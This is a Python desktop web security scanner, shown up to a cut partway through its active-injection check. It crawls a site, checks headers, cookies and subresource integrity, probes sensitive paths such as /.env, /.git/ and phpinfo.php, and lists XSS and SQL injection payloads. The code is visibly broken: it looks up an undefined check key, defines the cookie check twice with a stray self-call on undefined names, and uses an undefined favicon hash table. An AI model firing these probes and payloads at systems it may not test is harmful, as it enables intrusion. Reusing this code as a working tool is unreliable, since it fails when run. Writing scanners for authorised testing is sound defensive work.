import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import requests
from bs4 import BeautifulSoup
from datetime import datetime
import base64
import threading
import collections
from urllib.parse import urlparse, parse_qs, urljoin
import time
import re
import csv
import hashlib

# Your User-Agent
DEFAULT_USER_AGENT = "SoftwareAndDataIntegrityScanner/1.3 (https://github.com/yourusername/yourtool)"

class SecurityScannerGUI:
    def __init__(self, master):
        self.master = master
        master.title("Software and Data Integrity Scanner")
        # --- Setup UI layout ---
        # URL input
        self.url_label = tk.Label(master, text="Target URL:")
        self.url_label.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)
        self.url_entry = tk.Entry(master, width=50)
        self.url_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)

        # Timeout
        self.timeout_label = tk.Label(master, text="Timeout (seconds):")
        self.timeout_label.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)
        self.timeout_entry = tk.Entry(master, width=10)
        self.timeout_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.timeout_entry.insert(tk.END, "10")

        # Proxy
        self.proxy_label = tk.Label(master, text="Proxy (optional):")
        self.proxy_label.grid(row=2, column=0, padx=5, pady=5, sticky=tk.W)
        self.proxy_entry = tk.Entry(master, width=50)
        self.proxy_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.EW)

        # Max Depth
        self.depth_label = tk.Label(master, text="Max Depth (0 for current page):")
        self.depth_label.grid(row=3, column=0, padx=5, pady=5, sticky=tk.W)
        self.depth_entry = tk.Entry(master, width=10)
        self.depth_entry.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)
        self.depth_entry.insert(tk.END, "1")

        # Buttons
        self.scan_button = tk.Button(master, text="Scan", command=self.start_scan)
        self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.EW)
        self.stop_button = tk.Button(master, text="Stop", command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.grid(row=1, column=2, padx=5, pady=5, sticky=tk.EW)

        # Results Treeview
        self.results_tree = ttk.Treeview(master, columns=('Severity', 'Issue'), show='tree headings', selectmode='browse')
        self.results_tree.heading('#0', text='URL / Category')
        self.results_tree.heading('Severity', text='Severity')
        self.results_tree.heading('Issue', text='Issue Summary')
        self.results_tree.column('#0', width=300, anchor='w')
        self.results_tree.column('Severity', width=100, anchor='center')
        self.results_tree.column('Issue', width=400, anchor='w')
        self.results_tree.grid(row=4, column=0, columnspan=3, padx=5, pady=5, sticky=tk.NSEW)

        # Filter UI for severity
        filter_frame = tk.Frame(master)
        filter_frame.grid(row=4, column=3, sticky='N', padx=5, pady=5)
        tk.Label(filter_frame, text="Filter by severity:").pack(anchor='w')
        self.filter_vars = {
            "high": tk.BooleanVar(value=True),
            "medium": tk.BooleanVar(value=True),
            "low": tk.BooleanVar(value=True),
            "info": tk.BooleanVar(value=True)
        }
        for sev in self.filter_vars:
            cb = tk.Checkbutton(filter_frame, text=sev.capitalize(), variable=self.filter_vars[sev], command=self.refresh_results_view)
            cb.pack(anchor='w')

        # Additional Checks UI
        check_frame = tk.LabelFrame(master, text="Additional Checks")
        check_frame.grid(row=3, column=2, rowspan=2, padx=5, pady=5, sticky="NSEW")
        self.check_vars = {
            "headers_meta": tk.BooleanVar(value=True),
            "path_probe": tk.BooleanVar(value=True),
            "error_comment": tk.BooleanVar(value=True),
            "favicon_hash": tk.BooleanVar(value=True),
            "active_injection": tk.BooleanVar(value=True),
            "headers": tk.BooleanVar(value=True),
            "scripts": tk.BooleanVar(value=True),
            "updates": tk.BooleanVar(value=True),
            "csp": tk.BooleanVar(value=True),
            "sri": tk.BooleanVar(value=True),
            "deserialization": tk.BooleanVar(value=True),
            "xss_indicators": tk.BooleanVar(value=True),
            "open_redirect": tk.BooleanVar(value=True),
            "cors": tk.BooleanVar(value=True),
            "cookies": tk.BooleanVar(value=True),
            "directory_listing": tk.BooleanVar(value=True),
            "http_methods": tk.BooleanVar(value=True),
            "injection_get": tk.BooleanVar(value=True),
            "info_disclosure": tk.BooleanVar(value=True),
        }
        # Add checkbuttons for each
        tk.Checkbutton(check_frame, text="Headers & Meta", variable=self.check_vars["headers_meta"]).pack(anchor='w')
        tk.Checkbutton(check_frame, text="Path/File Probing", variable=self.check_vars["path_probe"]).pack(anchor='w')
        tk.Checkbutton(check_frame, text="Error & Comments", variable=self.check_vars["error_comment"]).pack(anchor='w')
        tk.Checkbutton(check_frame, text="Favicon Hashing", variable=self.check_vars["favicon_hash"]).pack(anchor='w')
        tk.Checkbutton(check_frame, text="Active Injection Tests", variable=self.check_vars["active_injection"]).pack(anchor='w')
        # Add more as needed...

        # Detailed Findings Text
        self.detail_area = scrolledtext.ScrolledText(master, height=5, state=tk.DISABLED)
        self.detail_area.grid(row=5, column=0, columnspan=3, padx=5, pady=5, sticky=tk.NSEW)

        # Save report button
        self.save_button = tk.Button(master, text="Save Report (HTML)", command=self.save_report, state=tk.DISABLED)
        self.save_button.grid(row=6, column=1, padx=5, pady=5)

        # Export findings CSV
        self.export_button = tk.Button(master, text="Export Findings CSV", command=self.export_findings_csv, state=tk.NORMAL)
        self.export_button.grid(row=6, column=2, padx=5, pady=5)

        # Status and progress
        self.progress_label = tk.Label(master, text="Status: Idle")
        self.progress_label.grid(row=7, column=0, padx=5, pady=5, sticky=tk.W)
        self.progress_bar = ttk.Progressbar(master, length=200, mode="indeterminate")
        self.progress_bar.grid(row=7, column=1, padx=5, pady=5, sticky=tk.EW)

        # Grid configuration
        master.grid_columnconfigure(1, weight=1)
        master.grid_rowconfigure(4, weight=1)
        master.grid_rowconfigure(5, weight=0)

        # Tag configuration for severity coloring
        self.results_tree.tag_configure('high', foreground='red')
        self.results_tree.tag_configure('medium', foreground='darkorange')
        self.results_tree.tag_configure('low', foreground='gold')
        self.results_tree.tag_configure('info', foreground='blue')

        # Internal states
        self.findings = []
        self.scan_thread = None
        self.stop_event = threading.Event()
        self.session = None
        self.base_domain = None
        self.tree_items = {}
        self._setup_ui_bindings()

    def _setup_ui_bindings(self):
        self.results_tree.bind('<<TreeviewSelect>>', self.on_finding_select)

    def _schedule_ui_update(self, func, *args, **kwargs):
        self.master.after(0, lambda: func(*args, **kwargs))

    def refresh_results_view(self):
        # Show/hide based on filters
        for item_id, details in self.tree_items.items():
            if isinstance(details, dict) and 'severity' in details:
                severity = details['severity']
                show = self.filter_vars.get(severity, tk.BooleanVar(value=True)).get()
                if show:
                    if not self.results_tree.exists(item_id):
                        parent_id = self.results_tree.parent(item_id)
                        index = self.results_tree.index(item_id)
                        self.results_tree.reattach(item_id, parent_id, index)
                else:
                    if self.results_tree.exists(item_id):
                        self.results_tree.detach(item_id)

    def start_scan(self):
        url = self.url_entry.get().strip()
        if not url:
            self.display_status("Please enter a target URL.", "info")
            return
        try:
            timeout = int(self.timeout_entry.get())
            if timeout <= 0:
                raise ValueError("Timeout must be positive")
        except:
            self.display_status("Invalid timeout value.", "high")
            return
        try:
            depth = int(self.depth_entry.get())
            if depth < 0:
                raise ValueError("Depth cannot be negative")
        except:
            self.display_status("Invalid depth value.", "high")
            return
        parsed = urlparse(url)
        if parsed.scheme not in ['http', 'https']:
            self.display_status("URL scheme must be http or https.", "high")
            return
        self.base_domain = parsed.netloc

        # Reset previous results
        self.results_tree.delete(*self.results_tree.get_children())
        self.detail_area.config(state=tk.NORMAL)
        self.detail_area.delete(1.0, tk.END)
        self.detail_area.config(state=tk.DISABLED)
        self.findings.clear()
        self.tree_items.clear()

        self.display_status(f"Scanning: {url}", "info")
        if depth > 0:
            self.display_status(f"Max Depth: {depth}", "info")
        proxy = self.proxy_entry.get().strip()

        # UI buttons
        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.save_button.config(state=tk.DISABLED)

        self.stop_event.clear()
        self.progress_bar.start()
        self.update_progress_label("Status: Starting scan...")

        # Run scan in thread
        self.scan_thread = threading.Thread(target=self.perform_scan, args=(url, timeout, proxy, depth))
        self.scan_thread.daemon = True
        self.scan_thread.start()

    def stop_scan(self):
        self.display_status("Scan requested to stop...", "info")
        self.stop_event.set()

    def perform_scan(self, url, timeout, proxy, max_depth):
        proxies = {"http": proxy, "https": proxy} if proxy else None
        self.session = requests.Session()
        self.session.proxies = proxies
        self.session.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        scan_queue = collections.deque([(url, 0)])
        visited = set()

        self._schedule_ui_update(self.update_progress_label, "Status: Initializing...")

        try:
            while scan_queue and not self.stop_event.is_set():
                current_url, depth = scan_queue.popleft()
                normalized_url = current_url.rstrip('/')
                if normalized_url in visited:
                    continue
                visited.add(normalized_url)

                self._schedule_ui_update(self.display_status, f"\nScanning: {current_url} (Depth {depth})")
                self._schedule_ui_update(self.update_progress_label, f"Status: Scanning {current_url} (Depth {depth})...")

                try:
                    response = self.session.get(current_url, timeout=timeout)
                    response.raise_for_status()
                    response.encoding = response.apparent_encoding
                    soup = BeautifulSoup(response.content, 'html.parser')

                    # Run checks
                    if self.check_vars["headers"].get():
                        self.check_http_headers(response.headers, current_url)
                    if self.check_vars["headers_meta"].get():
                        self.check_deep_headers_meta(response.headers, soup, current_url)
                    if self.check_vars["script"].get():
                        self.check_script_integrity(soup, current_url)
                    if self.check_vars["updates"].get():
                        self.check_update_integrity(current_url, soup)
                    if self.check_vars["csp"].get():
                        self.check_content_security_policy(response.headers, current_url)
                    if self.check_vars["sri"].get():
                        self.check_subresource_integrity(soup, current_url)
                    if self.check_vars["deserialization"].get():
                        self.check_deserialization_indicators(current_url, soup)
                    if self.check_vars["xss_indicators"].get():
                        self.check_xss_indicators(current_url, soup)
                    if self.check_vars["open_redirect"].get():
                        self.check_open_redirect_indicators(current_url)
                    if self.check_vars["cors"].get():
                        self.check_cors(response.headers, current_url)
                    if self.check_vars["cookies"].get():
                        self.check_cookie_security(response.cookies, current_url)
                    if self.check_vars["directory_listing"].get():
                        self.check_directory_listing(current_url, timeout)

                    # Path/File Probing
                    if self.check_vars["path_probe"].get():
                        self.check_additional_paths(current_url)

                    # Error and comment detection
                    if self.check_vars["error_comment"].get():
                        self.check_errors_comments(soup, current_url)

                    # Favicon hash
                    if self.check_vars["favicon_hash"].get():
                        self.check_favicon_hash(response.headers, current_url)

                    # Active injection tests
                    if self.check_vars["active_injection"].get():
                        self.check_parameter_injection(current_url, timeout)

                    # Crawl links if depth allows
                    if depth < max_depth:
                        for link in soup.find_all('a', href=True):
                            absolute_url = urljoin(current_url, link['href'])
                            parsed_link = urlparse(absolute_url)
                            if parsed_link.scheme in ['http', 'https'] and parsed_link.netloc == self.base_domain:
                                norm_link = absolute_url.rstrip('/')
                                if norm_link not in visited:
                                    scan_queue.append((absolute_url, depth + 1))
                except requests.exceptions.RequestException as e:
                    self.add_finding(current_url, "Request Error", f"{type(e).__name__}: {e}", "high")
                    self._schedule_ui_update(self.display_status, f"Error: {e}", "high")
                except Exception as e:
                    self.add_finding(current_url, "Unexpected Error", str(e), "high")
                    self._schedule_ui_update(self.display_status, f"Unexpected error: {e}", "high")

                if self.stop_event.is_set():
                    self._schedule_ui_update(self.display_status, "Scan stopped by user.", "info")
                    break

            if not self.stop_event.is_set():
                self._schedule_ui_update(self.display_status, "Scan finished.", "info")
                self._schedule_ui_update(self.update_progress_label, "Status: Scan finished.")
            else:
                self._schedule_ui_update(self.update_progress_label, "Status: Scan stopped.")
        finally:
            if self.session:
                self.session.close()
                self.session = None
            self._schedule_ui_update(self.progress_bar.stop)
            self._schedule_ui_update(self.scan_button.config, state=tk.NORMAL)
            self._schedule_ui_update(self.stop_button.config, state=tk.DISABLED)
            if self.findings:
                self._schedule_ui_update(self.save_button.config, state=tk.NORMAL)

    def update_progress_label(self, text):
        self._schedule_ui_update(self.progress_label.config, text=text)

    def display_status(self, message, severity="info"):
        self._schedule_ui_update(lambda: self.progress_label.config(text=f"Status: {message}"))

    def add_finding(self, url, category, message, severity):
        def _add():
            normalized_url = url.rstrip('/')
            if normalized_url not in self.tree_items:
                url_item = self.results_tree.insert('', 'end', text=normalized_url, open=True)
                self.tree_items[normalized_url] = url_item
            else:
                url_item = self.tree_items[normalized_url]
            category_id = f"{url_item}_{category.replace(' ', '_')}"
            if category_id not in self.tree_items:
                cat_item = self.results_tree.insert(url_item, 'end', text=category, open=True)
                self.tree_items[category_id] = cat_item
            else:
                cat_item = self.tree_items[category_id]
            # Show first line of message
            first_line = message.splitlines()[0]
            if len(first_line) > 100:
                first_line = first_line[:100] + "..."
            item_id = self.results_tree.insert(
                cat_item,
                'end',
                values=(severity.capitalize(), first_line),
                tags=(severity,)
            )
            self.tree_items[item_id] = {"url": url, "category": category, "message": message, "severity": severity}
            self.findings.append({"url": url, "category": category, "message": message, "severity": severity})
        self._schedule_ui_update(_add)

    def on_finding_select(self, event):
        selected = self.results_tree.selection()
        if not selected:
            self.detail_area.config(state=tk.NORMAL)
            self.detail_area.delete(1.0, tk.END)
            self.detail_area.config(state=tk.DISABLED)
            return
        item_id = selected[0]
        details = self.tree_items.get(item_id)
        if isinstance(details, dict) and 'message' in details:
            self.detail_area.config(state=tk.NORMAL)
            self.detail_area.delete(1.0, tk.END)
            self.detail_area.insert(tk.END, f"URL: {details['url']}\n")
            self.detail_area.insert(tk.END, f"Category: {details['category']}\n")
            self.detail_area.insert(tk.END, f"Severity: {details['severity'].capitalize()}\n\n")
            self.detail_area.insert(tk.END, details['message'])
            self.detail_area.config(state=tk.DISABLED)
        else:
            self.detail_area.config(state=tk.NORMAL)
            self.detail_area.delete(1.0, tk.END)
            self.detail_area.config(state=tk.DISABLED)

    def save_report(self):
        path = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML files", "*.html")])
        if not path:
            return
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        # Group findings
        severity_levels = ['high', 'medium', 'low', 'info']
        grouped = {level: [] for level in severity_levels}
        for f in self.findings:
            grouped[f['severity']].append(f)
        html = f"""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Security Scan Report</title>
<style>
body{{font-family:sans-serif;margin:20px;line-height:1.6}}
h1,h2,h3{{color:#333;margin-top:20px}}
.finding{{margin-bottom:15px;padding:15px;border:1px solid #ccc;border-radius:5px;word-break:break-word}}
.severity-high{{background-color:#ffebee;border-color:#ef9a9a;color:#c62828}}
.severity-medium{{background-color:#fff3e0;border-color:#ffb74d;color:#ef6c00}}
.severity-low{{background-color:#fffde7;border-color:#fff176;color:#fbc02d}}
.severity-info{{background-color:#e3f2fd;border-color:#90caf9;color:#2196f3}}
</style></head><body>
<h1>Security Scan Report</h1>
<p><strong>Target URL:</strong> {self.url_entry.get()}</p>
<p><strong>Scan Time:</strong> {now}</p>
<p><strong>Status:</strong> {'Stopped by user' if self.stop_event.is_set() else 'Finished'}</p>
<h2>Summary</h2>
<p>Total Findings: {len(self.findings)}</p>
<p>High: {len(grouped['high'])}</p>
<p>Medium: {len(grouped['medium'])}</p>
<p>Low: {len(grouped['low'])}</p>
<p>Info: {len(grouped['info'])}</p>
<h2>Details</h2>
"""
        if not self.findings:
            html += "<p>No significant findings.</p>"
        else:
            for level in severity_levels:
                if grouped[level]:
                    html += f"<h3>{level.capitalize()} ({len(grouped[level])})</h3>"
                    for f in grouped[level]:
                        html += f"<div class='finding severity-{level}'>"
                        html += f"<strong>URL:</strong> {f['url']}<br>"
                        html += f"<strong>Category:</strong> {f['category']}<br>"
                        html += f"<strong>Issue:</strong> {f['message']}<br></div>"
        html += "</body></html>"
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(html)
            messagebox.showinfo("Saved", "Report saved.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def export_findings_csv(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
        if not path:
            return
        try:
            with open(path, 'w', newline='', encoding='utf-8') as f:
                writer = csv.writer(f)
                writer.writerow(['URL', 'Category', 'Message', 'Severity'])
                for f in self.findings:
                    writer.writerow([f['url'], f['category'], f['message'], f['severity']])
            messagebox.showinfo("Exported", "Findings exported as CSV.")
        except Exception as e:
            messagebox.showerror("Error", str(e))

    # --- Checks ---

    def check_http_headers(self, headers, url):
        config = {
            "Server": {"desc": "Server info", "severity": "low", "check_func": self._check_server_header, "present_ok": True},
            "X-Powered-By": {"desc": "Backend tech", "severity": "low", "check_func": self._check_generic_info_header, "present_ok": True},
            "Strict-Transport-Security": {"desc": "HSTS", "severity": "high", "check_func": self._check_hsts, "present_ok": True},
            "Content-Security-Policy": {"desc": "CSP", "severity": "high", "check_func": self._check_csp_header, "present_ok": True},
            "X-Frame-Options": {"desc": "XFO", "severity": "medium", "check_func": self._check_xfo, "present_ok": True},
            "X-Content-Type-Options": {"desc": "X-Content-Type-Options", "severity": "high", "check_func": self._check_xcto, "present_ok": True},
            "Referrer-Policy": {"desc": "Referrer Policy", "severity": "low", "check_func": self._check_referrer_policy, "present_ok": True},
            "Permissions-Policy": {"desc": "Permissions Policy", "severity": "low", "check_func": None, "present_ok": True},
            "Cache-Control": {"desc": "Cache-Control", "severity": "low", "check_func": self._check_cache_control, "present_ok": True},
            "Pragma": {"desc": "Pragma", "severity": "info", "check_func": self._check_pragma, "present_ok": True},
            "Expires": {"desc": "Expires", "severity": "info", "check_func": self._check_expires, "present_ok": True},
            "X-XSS-Protection": {"desc": "X-XSS-Protection", "severity": "low", "check_func": self._check_xxssprotection, "present_ok": True},
            "Vary": {"desc": "Vary", "severity": "info", "check_func": None, "present_ok": True},
            "Access-Control-Allow-Origin": {"desc": "CORS", "severity": "medium", "check_func": self._check_cors, "present_ok": True}
        }
        for header, info in config.items():
            val = headers.get(header)
            if val:
                if info["check_func"]:
                    issue = info["check_func"](val)
                    if issue:
                        self.add_finding(url, "HTTP Header", f"{header}: {info['desc']} - {issue}", info["severity"])
            else:
                if info.get("present_ok", False):
                    self.add_finding(url, "HTTP Header", f"{header}: {info['desc']} missing", info["severity"])

    def _check_server_header(self, val):
        return False  # No specific check

    def _check_generic_info_header(self, val):
        return False

    def _check_hsts(self, val):
        if not val:
            return "Missing"
        val_lower = val.lower()
        if "max-age" not in val_lower:
            return "No max-age"
        try:
            max_age_str = re.search(r"max-age\s*=\s*(\d+)", val_lower)
            if max_age_str:
                max_age = int(max_age_str.group(1))
                if max_age < 31536000:
                    return f"Max-age too short ({max_age}s)"
        except:
            return "Invalid max-age"
        return False

    def _check_csp_header(self, val):
        issues = []
        v = val.lower()
        if "'unsafe-inline'" in v:
            issues.append("allows 'unsafe-inline'")
        if "'unsafe-eval'" in v:
            issues.append("allows 'unsafe-eval'")
        if not any(d in v for d in ['default-src', 'script-src', 'style-src']):
            issues.append("missing directives")
        if issues:
            return "CSP issues: " + ", ".join(issues)
        return False

    def _check_xfo(self, val):
        return None if val.lower() in ["deny", "sameorigin"] else "Misconfigured"

    def _check_xcto(self, val):
        return None if val.lower() == "nosniff" else "Missing 'nosniff'"

    def _check_referrer_policy(self, val):
        if not val:
            return "Missing"
        if val.lower() in ["unsafe-url", "no-referrer-when-downgrade"]:
            return "Potentially unsafe"
        return None

    def _check_cache_control(self, val):
        return False

    def _check_pragma(self, val):
        return None if val.lower() != "no-cache" else "Outdated"

    def _check_expires(self, val):
        return False

    def _check_xxssprotection(self, val):
        return None if val.strip().startswith("1") else "Disabled or not standard"

    def _check_cors(self, val):
        if val.strip() == "*":
            return "Allow all origins"
        return False

    def check_script_integrity(self, soup, url):
        scripts = soup.find_all('script', src=True)
        for s in scripts:
            src = s['src']
            integrity = s.get('integrity')
            crossorigin = s.get('crossorigin')
            if src and (src.startswith('http') or src.startswith('//')):
                if not integrity:
                    self.add_finding(url, "Script", f"External script {src} missing SRI", "high")
                else:
                    if not crossorigin:
                        self.add_finding(url, "Script", f"Script {src} with SRI missing crossorigin", "low")
                    elif crossorigin.lower() not in ['anonymous', 'use-credentials']:
                        self.add_finding(url, "Script", f"Script {src} crossorigin '{crossorigin}' not standard", "low")

    def check_subresource_integrity(self, soup, url):
        links = soup.find_all('link', rel='stylesheet', href=True)
        scripts = soup.find_all('script', src=True)
        for el in links + scripts:
            src = el.get('href') or el.get('src')
            integrity = el.get('integrity')
            crossorigin = el.get('crossorigin')
            if src and (src.startswith('http') or src.startswith('//')):
                if not integrity:
                    self.add_finding(url, "Subresource", f"{el.name} {src} missing SRI", "high")
                else:
                    if not crossorigin:
                        self.add_finding(url, "Subresource", f"{el.name} {src} missing crossorigin", "low")
                    elif crossorigin.lower() not in ['anonymous', 'use-credentials']:
                        self.add_finding(url, "Subresource", f"{el.name} {src} crossorigin '{crossorigin}' not standard", "low")

    def check_update_integrity(self, url, soup):
        # Look for update links and checksum links
        for a in soup.find_all('a', href=True):
            href = a['href']
            abs_url = urljoin(url, href)
            if any(h in href.lower() for h in ['.zip', '.tar.gz', '.exe', '.msi', '.rpm', '.deb', '.pkg', '.dmg']):
                self.add_finding(url, "Update Links", f"Potential update link: {abs_url}", "low")
            if a.string and any(t in a.string.lower() for t in ['checksum', 'sha', 'md5', 'signature', 'sig', 'hash']):
                self.add_finding(url, "Update Info", f"Checksum/signature link: {abs_url}", "low")
            if any(h.endswith(ext) for ext in ['.sha1', '.sha256', '.sha512', '.md5', '.asc', '.sig']):
                self.add_finding(url, "Update Info", f"Checksum/signature: {abs_url}", "low")
        # Meta tags
        for meta in soup.find_all('meta', attrs={'name': lambda x: x and ('version' in x.lower() or 'update' in x.lower())}):
            name = meta.get('name', '')
            content = meta.get('content', '')
            self.add_finding(url, "Meta Info", f"{name}: {content}", "info")
        # Check insecure HTTP links
        for a in soup.find_all('a', href=True):
            if a['href'].startswith('http://'):
                self.add_finding(url, "Insecure Link", a['href'], "medium")

    def check_content_security_policy(self, headers, url):
        csp = headers.get('Content-Security-Policy')
        report_only = headers.get('Content-Security-Policy-Report-Only')
        if not csp and not report_only:
            self.add_finding(url, "CSP", "Content-Security-Policy header missing", "high")
            return
        if csp:
            issues = self._check_csp_header(csp)
            if issues:
                severity = "high" if "'unsafe-inline'" in issues or "'unsafe-eval'" in issues else "medium"
                self.add_finding(url, "CSP", issues, severity)
        if report_only:
            self.add_finding(url, "CSP", f"Report-Only present: {report_only}", "info")

    def check_deserialization_indicators(self, url, soup):
        # Use HEAD request for Content-Type
        try:
            head_resp = self.session.head(url, timeout=float(self.timeout_entry.get()), allow_redirects=True)
            ctype = head_resp.headers.get('Content-Type', '')
            if "x-java-serialized-object" in ctype.lower():
                self.add_finding(url, "Deserialization", "Java serialized object detected", "medium")
            elif "vnd.php.serialized" in ctype.lower():
                self.add_finding(url, "Deserialization", "PHP serialized object detected", "medium")
        except:
            pass
        # Check URL params for base64
        parsed = urlparse(url)
        for k, v in parse_qs(parsed.query).items():
            for val in v:
                if len(val) > 20 and self.is_base64(val):
                    self.add_finding(url, "Deserialization", f"Potential base64 param: {k}={val[:50]}...", "low")

    def is_base64(self, s):
        try:
            return base64.b64encode(base64.b64decode(s)).decode() == s
        except:
            return False

    def check_xss_indicators(self, url, soup):
        parsed = urlparse(url)
        for param, values in parse_qs(parsed.query).items():
            for val in values:
                if val and len(val) > 3 and val in soup.get_text():
                    self.add_finding(url, "XSS", f"Reflected param {param} value: {val}", "low")

    def check_open_redirect_indicators(self, url):
        parsed = urlparse(url)
        for param in parse_qs(parsed.query):
            if any(keyword in param.lower() for keyword in ['url', 'next', 'redirect', 'destination', 'continue', 'to', 'link', 'return']):
                self.add_finding(url, "Open Redirect", f"Redirect param: {param}", "medium")

    def check_cors(self, headers, url):
        acao = headers.get('Access-Control-Allow-Origin')
        if acao:
            if acao.strip() == '*':
                self.add_finding(url, "CORS", "Allow all origins", "medium")

    def check_cookie_security(self, response_headers, url):
        set_cookie_headers = response_headers.get('Set-Cookie')
        if not set_cookie_headers:
            return
        # If multiple Set-Cookie headers, they are in a list
        if not isinstance(set_cookie_headers, list):
            set_cookie_headers = [set_cookie_headers]
        for header in set_cookie_headers:
            # Detect Secure
            secure_flag = re.search(r';\s*Secure', header, re.IGNORECASE)
            # Detect HttpOnly
            httponly_flag = re.search(r';\s*HttpOnly', header, re.IGNORECASE)
            # Detect SameSite
            samesite_match = re.search(r';\s*SameSite=([^;]+)', header, re.IGNORECASE)
            samesite = samesite_match.group(1) if samesite_match else "None"
            cookie_name_match = re.match(r'([^=]+)=', header)
            cookie_name = cookie_name_match.group(1).strip() if cookie_name_match else "unknown"
            issues = []
            if urlparse(url).scheme == 'https' and not secure_flag:
                issues.append("Missing Secure")
            if not httponly_flag:
                issues.append("Missing HttpOnly")
            if samesite.lower() not in ['lax', 'strict', 'none']:
                issues.append(f"Non-standard SameSite: {samesite}")
            if samesite.lower() == 'none' and urlparse(url).scheme == 'https' and not secure_flag:
                issues.append("SameSite=None requires Secure")
            if issues:
                self.add_finding(url, "Cookie Security", f"Cookie {cookie_name}: {', '.join(issues)}", "medium")

        self.check_cookie_security(response.headers, current_url)

    def check_directory_listing(self, url, timeout):
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        paths = ["/admin/", "/backup/", "/uploads/", "/temp/", "/test/", "/.git/", "/.svn/", "/config/", "/logs/"]
        for p in paths:
            test_url = urljoin(base_url, p)
            try:
                resp = self.session.get(test_url, timeout=timeout/2)
                if resp.status_code == 200:
                    txt = resp.text.lower()
                    if any(phrase in txt for phrase in ["index of /", "<title>index of /", "<pre>", "parent directory"]):
                        self.add_finding(url, "Directory Listing", f"Potential listing at {test_url}", "high")
            except:
                pass

    # --- Additional new checks ---

    def check_deep_headers_meta(self, headers, soup, url):
        # Header analysis for versions
        for header in ['Server', 'X-Powered-By', 'X-AspNet-Version', 'Via']:
            val = headers.get(header)
            if val:
                if 'Microsoft-IIS' in val:
                    version = re.search(r'IIS\s*([\d.]+)', val)
                    if version:
                        self.add_finding(url, "Header Info", f"{header}: {val} (version {version.group(1)})", "medium")
                elif 'Apache' in val:
                    pass
        # Meta tags
        for meta in soup.find_all('meta'):
            name_attr = meta.get('name', '').lower()
            content = meta.get('content', '')
            if name_attr in ['generator', 'author', 'description']:
                self.add_finding(url, "Meta Tag", f"{name_attr}: {content}", "info")
        # Comments
        comments = soup.find_all(string=lambda text: isinstance(text, str) and '!--' in text)
        for comment in comments:
            if 'password' in comment.lower() or 'secret' in comment.lower():
                self.add_finding(url, "Comment", f"Sensitive info in comment: {comment}", "high")

    def check_additional_paths(self, base_url):
        paths = [
            "/.env", "/robots.txt", "/sitemap.xml", "/phpinfo.php", "/test.php", "/backup.sql",
            "/config.json", "/admin", "/wp-admin", "/user/login", "/admin/phpmyadmin"
        ]
        for p in paths:
            full_url = urljoin(base_url, p)
            try:
                resp = self.session.get(full_url, timeout=5)
                if resp.status_code == 200:
                    self.add_finding(full_url, "Probing", f"Found accessible {p}", "medium")
                if 'phpinfo()' in resp.text:
                    self.add_finding(full_url, "File Access", "phpinfo() page accessible", "high")
            except:
                pass

    def check_errors_comments(self, soup, url):
        body_text = soup.get_text()
        error_patterns = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'syntax error', 'unclosed quotation', 
            'stack trace', 'exception', 'disallowed keyword', 'warning:'
        ]
        for pattern in error_patterns:
            if pattern.lower() in body_text.lower():
                self.add_finding(url, "Error Message", f"Detected pattern: {pattern}", "high")
        # Comments
        comments = soup.find_all(string=lambda text: isinstance(text, str) and '!--' in text)
        for comment in comments:
            if 'password' in comment.lower() or 'secret' in comment.lower():
                self.add_finding(url, "Comment", f"Sensitive info: {comment}", "high")

    def check_favicon_hash(self, headers, url):
        favicon_url = urljoin(url, '/favicon.ico')
        try:
            resp = self.session.get(favicon_url, timeout=5)
            if resp.status_code == 200:
                favicon_bytes = resp.content
                md5_hash = hashlib.md5(favicon_bytes).hexdigest()
                sha1_hash = hashlib.sha1(favicon_bytes).hexdigest()
                # Check against known hashes
                if md5_hash in known_favicon_hashes:
                    self.add_finding(url, "Favicon", f"MD5 hash matches: {known_favicon_hashes[md5_hash]}", "info")
                elif sha1_hash in known_favicon_hashes:
                    self.add_finding(url, "Favicon", f"SHA1 hash matches: {known_favicon_hashes[sha1_hash]}", "info")
        except:
            pass
    def check_cookie_security(self, response_headers, url):
        set_cookie_headers = response_headers.get('Set-Cookie')
        if not set_cookie_headers:
            return
        # If multiple Set-Cookie headers, they are in a list
        if not isinstance(set_cookie_headers, list):
            set_cookie_headers = [set_cookie_headers]
        for header in set_cookie_headers:
            # Detect Secure
            secure_flag = re.search(r';\s*Secure', header, re.IGNORECASE)
            # Detect HttpOnly
            httponly_flag = re.search(r';\s*HttpOnly', header, re.IGNORECASE)
            # Detect SameSite
            samesite_match = re.search(r';\s*SameSite=([^;]+)', header, re.IGNORECASE)
            samesite = samesite_match.group(1) if samesite_match else "None"
            cookie_name_match = re.match(r'([^=]+)=', header)
            cookie_name = cookie_name_match.group(1).strip() if cookie_name_match else "unknown"
            issues = []
            if urlparse(url).scheme == 'https' and not secure_flag:
                issues.append("Missing Secure")
            if not httponly_flag:
                issues.append("Missing HttpOnly")
            if samesite.lower() not in ['lax', 'strict', 'none']:
                issues.append(f"Non-standard SameSite: {samesite}")
            if samesite.lower() == 'none' and urlparse(url).scheme == 'https' and not secure_flag:
                issues.append("SameSite=None requires Secure")
            if issues:
                self.add_finding(url, "Cookie Security", f"Cookie {cookie_name}: {', '.join(issues)}", "medium")

    def check_parameter_injection(self, url, timeout):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
        # Payloads
        xss_payloads = [
            "<script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "';!--\"<XSS>=&{()}",
            "<svg/onload=alert(1)>",
            "<body onload=alert(1)>",
        ]

        sqli_payloads = [
            "'",
            '"',
            "--",
            "' OR '1'='1",
            '" OR "1"="1',
